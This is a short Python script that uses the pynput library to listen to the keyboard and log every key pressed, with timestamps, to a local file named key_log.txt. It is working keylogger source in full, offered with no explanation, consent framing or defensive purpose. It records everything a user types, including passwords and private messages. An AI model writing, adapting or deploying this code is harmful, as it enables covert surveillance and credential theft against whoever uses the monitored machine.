from pynput.keyboard import Key, Listener
import logging

# Setup logging
log_dir = ""  # Directory to save the log file
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Define the on_press function
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

# Start listening to the keyboard
with Listener(on_press=on_press) as listener:
    listener.join()
